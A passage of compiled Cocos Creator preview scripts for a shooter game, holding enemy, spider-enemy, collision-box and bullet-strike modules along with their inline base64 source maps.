JhbmRvbSgpKjEwKSk7XHJcblxyXG4gICAgICAgICAgICAgICAgYnVsbGV0Mi5mbHkoZGlyLnJvdGF0ZShjYy5taXNjLmRlZ3JlZXNUb1JhZGlhbnMoLXRoaXMuZGVncmVlLWRlZ3JlZSkpLCB0aGlzLl9maXJpbmdSYW5nZSwgdGhpcy5fc3BlZWQpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgY2FzZSAyOlxyXG4gICAgICAgICAgICAgICAgLyoqIOWPkeWwhOS4gOmilyAqL1xyXG4gICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICBsZXQgZGVncmVlID0gTWF0aC5yYW5kb20oKSoyO1xyXG4gICAgICAgICAgICAgICAgdGhpcy5kZWdyZWUgPSB0aGlzLmRlZ3JlZSA+IDAgPyAtZGVncmVlIDogZGVncmVlO1xyXG4gICAgICAgICAgICAgICAgbGV0IGJ1bGxldCA9IHRoaXMuZ2FtZUJ1bGxldHNDb250cm9sbGVyLmdldEluYWN0aXZlQnVsbGV0KEJ1bGxldEVtaXR0ZXIuVFlQRVMuSmlhVGVMaW4pO1xyXG4gICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICAgICAgICAgIGJ1bGxldC5ub2RlLnBvc2l0aW9uID0gc3RhcnQ7XHJcblxyXG4gICAgICAgICAgICAgICAgYnVsbGV0LmZseShkaXIucm90YXRlKGNjLm1pc2MuZGVncmVlc1RvUmFkaWFucyh0aGlzLmRlZ3JlZSkpLCB0aGlzLl9maXJpbmdSYW5nZSwgdGhpcy5fc3BlZWQpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgY2FzZSAzOlxyXG4gICAgICAgICAgICAgICAgLyoqIOWkp+inkuW6puWQjOaXtuWPkeWwhOS4pOmilyAqL1xyXG4gICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICBsZXQgZGVncmVlID0gMTAgKyBNYXRoLnJhbmRvbSgpICogNTtcclxuICAgICAgICAgICAgICAgIGxldCBidWxsZXQxID0gdGhpcy5nYW1lQnVsbGV0c0NvbnRyb2xsZXIuZ2V0SW5hY3RpdmVCdWxsZXQoQnVsbGV0RW1pdHRlci5UWVBFUy5KaWFUZUxpbik7XHJcbiAgICAgICAgICAgICAgICBidWxsZXQxLm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICAgICAgICAgIGJ1bGxldDEubm9kZS5wb3NpdGlvbiA9IHN0YXJ0LmFkZChkaXIubXVsKE1hdGgucmFuZG9tKCkqLTE1KSk7XHJcblxyXG4gICAgICAgICAgICAgICAgYnVsbGV0MS5mbHkoZGlyLnJvdGF0ZShjYy5taXNjLmRlZ3JlZXNUb1JhZGlhbnModGhpcy5kZWdyZWUrZGVncmVlKSksIHRoaXMuX2ZpcmluZ1JhbmdlLCB0aGlzLl9zcGVlZCk7XHJcblxyXG4gICAgICAgICAgICAgICAgbGV0IGJ1bGxldDIgPSB0aGlzLmdhbWVCdWxsZXRzQ29udHJvbGxlci5nZXRJbmFjdGl2ZUJ1bGxldChCdWxsZXRFbWl0dGVyLlRZUEVTLkppYVRlTGluKTtcclxuICAgICAgICAgICAgICAgIGJ1bGxldDIubm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgYnVsbGV0Mi5ub2RlLnBvc2l0aW9uID0gc3RhcnQuYWRkKGRpci5tdWwoTWF0aC5yYW5kb20oKSoxNSkpO1xyXG5cclxuICAgICAgICAgICAgICAgIGJ1bGxldDIuZmx5KGRpci5yb3RhdGUoY2MubWlzYy5kZWdyZWVzVG9SYWRpYW5zKC10aGlzLmRlZ3JlZS1kZWdyZWUpKSwgdGhpcy5fZmlyaW5nUmFuZ2UsIHRoaXMuX3NwZWVkKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHRoaXMubnVtKys7XHJcbiAgICB9XHJcbn1cclxuXHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bulletStrike/BulletStrike.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'b5d9awRm+ZLZrIZ/r0dvhir', 'BulletStrike');
// script/app/entities/bulletStrike/BulletStrike.ts

Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var BulletStrike = /** @class */ (function (_super) {
    __extends(BulletStrike, _super);
    function BulletStrike() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    BulletStrike = __decorate([
        ccclass
    ], BulletStrike);
    return BulletStrike;
}(cc.Component));
exports.default = BulletStrike;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldFN0cmlrZS9CdWxsZXRTdHJpa2UudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNNLElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQW1ELGdDQUFZO0lBQS9EOztJQUlBLENBQUM7SUFKNkIsWUFBWTtRQUR6QyxPQUFPO09BQ3NCLFlBQVksQ0FJekM7SUFBRCxtQkFBQztDQUpELEFBSUMsQ0FKa0QsRUFBRSxDQUFDLFNBQVMsR0FJOUQ7a0JBSjZCLFlBQVkiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBhYnN0cmFjdCBjbGFzcyBCdWxsZXRTdHJpa2UgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIGFic3RyYWN0IGluaXQoaWQpO1xyXG4gICAgYWJzdHJhY3Qgc3RyaWtlKCk7XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/enemy/SpiderEnemy.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '944dfHPyTJMzJibewidrYiK', 'SpiderEnemy');
// script/app/entities/enemy/SpiderEnemy.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Music_1 = require("../../../../framework/audio/Music");
var GameProxy_1 = require("../../game/GameProxy");
var Enemy_1 = require("./Enemy");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var SpiderEnemy = /** @class */ (function (_super) {
    __extends(SpiderEnemy, _super);
    function SpiderEnemy() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.blinkNode = null;
        return _this;
    }
    Object.defineProperty(SpiderEnemy.prototype, "bAcc", {
        set: function (value) {
            this._bAcc = value;
            if (this._bAcc && !this.blinkNode.active) {
                this.blinkNode.active = true;
                this.blinkNode.runAction(cc.repeatForever(cc.blink(1, 3)));
                var duration = 0.5;
                var repeatFunc = function () {
                    if (!GameProxy_1.GameProxy.pauseGame) {
                        Music_1.Music.playSFX("sound/msc_en002");
                    }
                    // this.node.runAction(cc.sequence(cc.delayTime(duration), cc.callFunc(repeatFunc)));
                    // if (duration > 0.3){
                    //     duration -= duration/10;
                    // }
                };
                repeatFunc();
            }
        },
        enumerable: false,
        configurable: true
    });
    SpiderEnemy.prototype.doAttack = function () {
        this.hp = 0;
        console.log("爆炸蜘蛛死掉");
    };
    SpiderEnemy.prototype.playDead = function () {
        _super.prototype.playDead.call(this);
        /** 爆炸 */
        var bullet = window['GameBulletsController'].getInactiveEnemyBullet(this._enemyID);
        bullet.node.position = this.node.position;
        bullet.node.rotation = this.node.rotation;
        bullet.node.active = true;
        bullet.boom();
    };
    SpiderEnemy.prototype.reset = function () {
        _super.prototype.reset.call(this);
        this.blinkNode.stopAllActions();
        this.blinkNode.active = false;
    };
    __decorate([
        property(cc.Node)
    ], SpiderEnemy.prototype, "blinkNode", void 0);
    SpiderEnemy = __decorate([
        ccclass
    ], SpiderEnemy);
    return SpiderEnemy;
}(Enemy_1.default));
exports.default = SpiderEnemy;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2VuZW15L1NwaWRlckVuZW15LnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFFQSwyREFBd0Q7QUFDeEQsa0RBQStDO0FBQy9DLGlDQUE0QjtBQUV0QixJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUF5QywrQkFBSztJQUE5QztRQUFBLHFFQWlEQztRQTlDRyxlQUFTLEdBQVcsSUFBSSxDQUFDOztJQThDN0IsQ0FBQztJQTVDRyxzQkFBSSw2QkFBSTthQUFSLFVBQVMsS0FBYztZQUNuQixJQUFJLENBQUMsS0FBSyxHQUFHLEtBQUssQ0FBQztZQUNuQixJQUFJLElBQUksQ0FBQyxLQUFLLElBQUksQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLE1BQU0sRUFBQztnQkFDckMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDO2dCQUM3QixJQUFJLENBQUMsU0FBUyxDQUFDLFNBQVMsQ0FBQyxFQUFFLENBQUMsYUFBYSxDQUFDLEVBQUUsQ0FBQyxLQUFLLENBQUMsQ0FBQyxFQUFFLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztnQkFDM0QsSUFBSSxRQUFRLEdBQUcsR0FBRyxDQUFDO2dCQUNuQixJQUFJLFVBQVUsR0FBRztvQkFDYixJQUFJLENBQUMscUJBQVMsQ0FBQyxTQUFTLEVBQUM7d0JBQ3JCLGFBQUssQ0FBQyxPQUFPLENBQUMsaUJBQWlCLENBQUMsQ0FBQztxQkFDcEM7b0JBQ0QscUZBQXFGO29CQUNyRix1QkFBdUI7b0JBQ3ZCLCtCQUErQjtvQkFDL0IsSUFBSTtnQkFDUixDQUFDLENBQUM7Z0JBQ0YsVUFBVSxFQUFFLENBQUM7YUFDaEI7UUFDTCxDQUFDOzs7T0FBQTtJQUdTLDhCQUFRLEdBQWxCO1FBQ0ksSUFBSSxDQUFDLEVBQUUsR0FBRyxDQUFDLENBQUM7UUFDWixPQUFPLENBQUMsR0FBRyxDQUFDLFFBQVEsQ0FBQyxDQUFBO0lBQ3pCLENBQUM7SUFHRCw4QkFBUSxHQUFSO1FBQ0ksaUJBQU0sUUFBUSxXQUFFLENBQUM7UUFDakIsU0FBUztRQUNULElBQUksTUFBTSxHQUFtQixNQUFNLENBQUMsdUJBQXVCLENBQUMsQ0FBQyxzQkFBc0IsQ0FBQyxJQUFJLENBQUMsUUFBUSxDQUFDLENBQUM7UUFDbkcsTUFBTSxDQUFDLElBQUksQ0FBQyxRQUFRLEdBQUcsSUFBSSxDQUFDLElBQUksQ0FBQyxRQUFRLENBQUM7UUFDMUMsTUFBTSxDQUFDLElBQUksQ0FBQyxRQUFRLEdBQUcsSUFBSSxDQUFDLElBQUksQ0FBQyxRQUFRLENBQUM7UUFDMUMsTUFBTSxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDO1FBQzFCLE1BQU0sQ0FBQyxJQUFJLEVBQUUsQ0FBQztJQUNsQixDQUFDO0lBRUQsMkJBQUssR0FBTDtRQUNJLGlCQUFNLEtBQUssV0FBRSxDQUFDO1FBQ2QsSUFBSSxDQUFDLFNBQVMsQ0FBQyxjQUFjLEVBQUUsQ0FBQztRQUNoQyxJQUFJLENBQUMsU0FBUyxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7SUFDbEMsQ0FBQztJQTFDRDtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDO2tEQUNPO0lBSFIsV0FBVztRQUQvQixPQUFPO09BQ2EsV0FBVyxDQWlEL0I7SUFBRCxrQkFBQztDQWpERCxBQWlEQyxDQWpEd0MsZUFBSyxHQWlEN0M7a0JBakRvQixXQUFXIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCBCdWxsZXRPZlNwaWRlciBmcm9tIFwiLi4vYnVsbGV0L0J1bGxldE9mU3BpZGVyXCI7XHJcbmltcG9ydCB7TXVzaWN9IGZyb20gXCIuLi8uLi8uLi8uLi9mcmFtZXdvcmsvYXVkaW8vTXVzaWNcIjtcclxuaW1wb3J0IHtHYW1lUHJveHl9IGZyb20gXCIuLi8uLi9nYW1lL0dhbWVQcm94eVwiO1xyXG5pbXBvcnQgRW5lbXkgZnJvbSBcIi4vRW5lbXlcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgU3BpZGVyRW5lbXkgZXh0ZW5kcyBFbmVteSB7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBibGlua05vZGU6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgc2V0IGJBY2ModmFsdWU6IGJvb2xlYW4pIHtcclxuICAgICAgICB0aGlzLl9iQWNjID0gdmFsdWU7XHJcbiAgICAgICAgaWYgKHRoaXMuX2JBY2MgJiYgIXRoaXMuYmxpbmtOb2RlLmFjdGl2ZSl7XHJcbiAgICAgICAgICAgIHRoaXMuYmxpbmtOb2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgICAgIHRoaXMuYmxpbmtOb2RlLnJ1bkFjdGlvbihjYy5yZXBlYXRGb3JldmVyKGNjLmJsaW5rKDEsIDMpKSk7XHJcbiAgICAgICAgICAgIGxldCBkdXJhdGlvbiA9IDAuNTtcclxuICAgICAgICAgICAgbGV0IHJlcGVhdEZ1bmMgPSAoKT0+e1xyXG4gICAgICAgICAgICAgICAgaWYgKCFHYW1lUHJveHkucGF1c2VHYW1lKXtcclxuICAgICAgICAgICAgICAgICAgICBNdXNpYy5wbGF5U0ZYKFwic291bmQvbXNjX2VuMDAyXCIpO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgLy8gdGhpcy5ub2RlLnJ1bkFjdGlvbihjYy5zZXF1ZW5jZShjYy5kZWxheVRpbWUoZHVyYXRpb24pLCBjYy5jYWxsRnVuYyhyZXBlYXRGdW5jKSkpO1xyXG4gICAgICAgICAgICAgICAgLy8gaWYgKGR1cmF0aW9uID4gMC4zKXtcclxuICAgICAgICAgICAgICAgIC8vICAgICBkdXJhdGlvbiAtPSBkdXJhdGlvbi8xMDtcclxuICAgICAgICAgICAgICAgIC8vIH1cclxuICAgICAgICAgICAgfTtcclxuICAgICAgICAgICAgcmVwZWF0RnVuYygpO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcblxyXG4gICAgcHJvdGVjdGVkIGRvQXR0YWNrKCk6IHZvaWQge1xyXG4gICAgICAgIHRoaXMuaHAgPSAwO1xyXG4gICAgICAgIGNvbnNvbGUubG9nKFwi54iG54K46JyY6Jub5q275o6JXCIpXHJcbiAgICB9XHJcblxyXG5cclxuICAgIHBsYXlEZWFkKCk6IHZvaWQge1xyXG4gICAgICAgIHN1cGVyLnBsYXlEZWFkKCk7XHJcbiAgICAgICAgLyoqIOeIhueCuCAqL1xyXG4gICAgICAgIGxldCBidWxsZXQgPSA8QnVsbGV0T2ZTcGlkZXI+d2luZG93WydHYW1lQnVsbGV0c0NvbnRyb2xsZXInXS5nZXRJbmFjdGl2ZUVuZW15QnVsbGV0KHRoaXMuX2VuZW15SUQpO1xyXG4gICAgICAgIGJ1bGxldC5ub2RlLnBvc2l0aW9uID0gdGhpcy5ub2RlLnBvc2l0aW9uO1xyXG4gICAgICAgIGJ1bGxldC5ub2RlLnJvdGF0aW9uID0gdGhpcy5ub2RlLnJvdGF0aW9uO1xyXG4gICAgICAgIGJ1bGxldC5ub2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgYnVsbGV0LmJvb20oKTtcclxuICAgIH1cclxuXHJcbiAgICByZXNldCgpOiB2b2lkIHtcclxuICAgICAgICBzdXBlci5yZXNldCgpO1xyXG4gICAgICAgIHRoaXMuYmxpbmtOb2RlLnN0b3BBbGxBY3Rpb25zKCk7XHJcbiAgICAgICAgdGhpcy5ibGlua05vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICB9XHJcblxyXG5cclxuXHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/enemy/EnemyAABB.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '2fd84qgTxlNla8RAGPr2aOb', 'EnemyAABB');
// script/app/entities/enemy/EnemyAABB.ts

Object.defineProperty(exports, "__esModule", { value: true });
var AABBRegion_1 = require("../../../quad-tree/AABBRegion");
var Enemy_1 = require("./Enemy");
var _a = cc._decorator, ccclass = _a.ccclass, disallowMultiple = _a.disallowMultiple;
var EnemyAABB = /** @class */ (function (_super) {
    __extends(EnemyAABB, _super);
    function EnemyAABB() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this._radius = 0;
        _this._enemy = null;
        return _this;
    }
    Object.defineProperty(EnemyAABB.prototype, "enemy", {
        get: function () {
            return this._enemy;
        },
        enumerable: false,
        configurable: true
    });
    EnemyAABB.prototype.onLoad = function () {
        this._radius = this.getComponent(cc.CircleCollider).radius;
        this._enemy = this.getComponent(Enemy_1.default);
    };
    EnemyAABB.prototype.aabb = function () {
        var doubleRadius = this._radius * 2;
        return cc.rect(this.node.x - this._radius, this.node.y - this._radius, doubleRadius, doubleRadius);
    };
    EnemyAABB = __decorate([
        ccclass,
        disallowMultiple
    ], EnemyAABB);
    return EnemyAABB;
}(AABBRegion_1.default));
exports.default = EnemyAABB;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2VuZW15L0VuZW15QUFCQi50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EsNERBQXVEO0FBQ3ZELGlDQUE0QjtBQUV0QixJQUFBLEtBQThCLEVBQUUsQ0FBQyxVQUFVLEVBQTFDLE9BQU8sYUFBQSxFQUFFLGdCQUFnQixzQkFBaUIsQ0FBQztBQUlsRDtJQUF1Qyw2QkFBVTtJQUFqRDtRQUFBLHFFQW9CQztRQWxCVyxhQUFPLEdBQUcsQ0FBQyxDQUFDO1FBRVosWUFBTSxHQUFTLElBQUksQ0FBQzs7SUFnQmhDLENBQUM7SUFiRyxzQkFBSSw0QkFBSzthQUFUO1lBQ0ksT0FBTyxJQUFJLENBQUMsTUFBTSxDQUFDO1FBQ3ZCLENBQUM7OztPQUFBO0lBRUQsMEJBQU0sR0FBTjtRQUNJLElBQUksQ0FBQyxPQUFPLEdBQUcsSUFBSSxDQUFDLFlBQVksQ0FBQyxFQUFFLENBQUMsY0FBYyxDQUFDLENBQUMsTUFBTSxDQUFDO1FBQzNELElBQUksQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDLFlBQVksQ0FBQyxlQUFLLENBQUMsQ0FBQztJQUMzQyxDQUFDO0lBRUQsd0JBQUksR0FBSjtRQUNJLElBQUksWUFBWSxHQUFHLElBQUksQ0FBQyxPQUFPLEdBQUcsQ0FBQyxDQUFDO1FBQ3BDLE9BQU8sRUFBRSxDQUFDLElBQUksQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLENBQUMsR0FBRyxJQUFJLENBQUMsT0FBTyxFQUFFLElBQUksQ0FBQyxJQUFJLENBQUMsQ0FBQyxHQUFHLElBQUksQ0FBQyxPQUFPLEVBQUUsWUFBWSxFQUFFLFlBQVksQ0FBQyxDQUFDO0lBQ3ZHLENBQUM7SUFuQmdCLFNBQVM7UUFGN0IsT0FBTztRQUNQLGdCQUFnQjtPQUNJLFNBQVMsQ0FvQjdCO0lBQUQsZ0JBQUM7Q0FwQkQsQUFvQkMsQ0FwQnNDLG9CQUFVLEdBb0JoRDtrQkFwQm9CLFNBQVMiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IEFBQkJSZWdpb24gZnJvbSBcIi4uLy4uLy4uL3F1YWQtdHJlZS9BQUJCUmVnaW9uXCI7XHJcbmltcG9ydCBFbmVteSBmcm9tIFwiLi9FbmVteVwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIGRpc2FsbG93TXVsdGlwbGV9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbkBkaXNhbGxvd011bHRpcGxlXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIEVuZW15QUFCQiBleHRlbmRzIEFBQkJSZWdpb24ge1xyXG5cclxuICAgIHByaXZhdGUgX3JhZGl1cyA9IDA7XHJcblxyXG4gICAgcHJpdmF0ZSBfZW5lbXk6RW5lbXkgPSBudWxsO1xyXG5cclxuXHJcbiAgICBnZXQgZW5lbXkoKTogRW5lbXkge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9lbmVteTtcclxuICAgIH1cclxuXHJcbiAgICBvbkxvYWQoKXtcclxuICAgICAgICB0aGlzLl9yYWRpdXMgPSB0aGlzLmdldENvbXBvbmVudChjYy5DaXJjbGVDb2xsaWRlcikucmFkaXVzO1xyXG4gICAgICAgIHRoaXMuX2VuZW15ID0gdGhpcy5nZXRDb21wb25lbnQoRW5lbXkpO1xyXG4gICAgfVxyXG5cclxuICAgIGFhYmIoKTogY2MuUmVjdCB7XHJcbiAgICAgICAgbGV0IGRvdWJsZVJhZGl1cyA9IHRoaXMuX3JhZGl1cyAqIDI7XHJcbiAgICAgICAgcmV0dXJuIGNjLnJlY3QodGhpcy5ub2RlLnggLSB0aGlzLl9yYWRpdXMsIHRoaXMubm9kZS55IC0gdGhpcy5fcmFkaXVzLCBkb3VibGVSYWRpdXMsIGRvdWJsZVJhZGl1cyk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/enemy/Enemy.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '1ab695SfTxHj46gL5xG1BMg', 'Enemy');
// script/app/entities/enemy/Enemy.ts

Object.defineProperty(exports, "__esModule", { value: true });
var EnemyAABB_1 = require("./EnemyAABB");
var ExcelTableNames_1 = require("../../config/ExcelTableNames");
var ExcelConfig_1 = require("../../../../framework/config/ExcelConfig");
var GameProxy_1 = require("../../game/GameProxy");
var Music_1 = require("../../../../framework/audio/Music");
var Extend_1 = require("../../../../framework/extend/Extend");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var AttackDelayList = [0.4, 0.4, 0, 0.2, 0.3, 0.3, 0.3, 0.5];
var BASE_TIME_SCALE = 1.5;
var Enemy = /** @class */ (function (_super) {
    __extends(Enemy, _super);
    function Enemy() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.ske = null;
        _this.attackCD = 1;
        _this._gameSlow = false;
        _this._moveSpeed = 0;
        /** 速度的加成 */
        _this._speedAdd = 1;
        _this._bAcc = false;
        _this.accSpeed = 0;
        _this.foundRange = 0;
        _this.attackDistance = 100;
        _this.bulletSpeed = 0;
        _this.unrepel = 0;
        _this.maxHp = 0;
        /** 死后爆汁缩放 */
        _this.humorScale = 1;
        /** 金币数 */
        _this.gold = 0;
        /** 金币图标掉落 */
        _this.goldIconFell = 1;
        _this.speedcut = 0;
        /** 移动标志 */
        _this.moveFlag = false;
        /** 转向角色标志 */
        _this.lookAtRoleFlag = false;
        /** 攻击冷却中 */
        _this.attackCoolingFlag = false;
        /** 逻辑处理标志 */
        _this.logicFlag = false;
        /** 移动方向 */
        _this.moveDir = cc.v2();
        /** 僵硬 */
        _this._stiff = false;
        _this._hp = 0;
        _this.hurt = 0;
        _this.hierarchy = 0;
        /** 综合属性 */
        /** 敏捷度 */
        _this.agility = 0;
        _this._strikeCompleteTime = 0;
        _this._spaceCircleCollider = null;
        _this._defenceBoxCollider = null;
        _this._enemyAABB = null;
        _this._bounds = cc.rect();
        _this._enemyID = 0;
        _this.attackDelayTime = -1;
        return _this;
    }
    Object.defineProperty(Enemy.prototype, "gameSlow", {
        set: function (value) {
            this._gameSlow = value;
            var timeScale = BASE_TIME_SCALE;
            if (this._gameSlow) {
                timeScale *= 0.2;
            }
            this.ske.timeScale = timeScale;
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(Enemy.prototype, "speedAdd", {
        get: function () {
            return this._speedAdd;
        },
        set: function (value) {
            this._speedAdd = value;
            this.ske.timeScale = BASE_TIME_SCALE * value;
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(Enemy.prototype, "bAcc", {
        set: function (value) {
            this._bAcc = value;
            if (this._bAcc && this.enemyID > 3) {
                Music_1.Music.playSFX("sound/msc_en003", 0.6);
            }
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(Enemy.prototype, "moveSpeed", {
        get: function () {
            return this._moveSpeed * (this._bAcc ? this.accSpeed : 1) * this._speedAdd * (this._gameSlow ? 0.2 : 1);
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(Enemy.prototype, "stiff", {
        get: function () {
            return this._stiff;
        },
        set: function (value) {
            this._stiff = value;
            this.playStand();
        },
        enumerable: false,
        configurable: true
    });
    Enemy.prototype.doStiff = function (stiff) {
        var _this = this;
        this.stiff = true;
        var action = cc.sequence(cc.delayTime(stiff), cc.callFunc(function () { return _this.stiff = false; }));
        action.setTag(1230);
        this.node.stopActionByTag(1230);
        this.node.runAction(action);
    };
    Enemy.prototype.doSpeedcut = function () {
        var _this = this;
        if (this.speedcut > 0) {
            this.speedAdd = 1 - this.speedcut;
            var action = cc.sequence(cc.delayTime(0.15), cc.callFunc(function () { return _this.speedAdd = 1; }));
            action.setTag(2510);
            this.node.stopActionByTag(2510);
            this.node.runAction(action);
        }
    };
    Enemy.prototype.doRepel = function (dir, repel) {
        var _this = this;
        this.playBeaten();
        /** 计算与边线线段的交点 */
        var delta = dir.mul(repel);
        var destPos = this.node.position.add(delta);
        var intersections = [];
        if (dir.x > 0) {
            //右边界
            if (destPos.x >= this._bounds.xMax) {
                var point = cc.v2();
                if (cc.Intersection.pLineIntersect(this.node.position, destPos, cc.v2(this._bounds.xMax, this._bounds.yMin), cc.v2(this._bounds.xMax, this._bounds.yMax), point)) {
                    intersections.push(point);
                }
            }
        }
        else if (dir.x < 0) {
            //左边界
            if (destPos.x <= this._bounds.xMin) {
                var point = cc.v2();
                if (cc.Intersection.pLineIntersect(this.node.position, destPos, cc.v2(this._bounds.xMin, this._bounds.yMin), cc.v2(this._bounds.xMin, this._bounds.yMax), point)) {
                    intersections.push(point);
                }
            }
        }
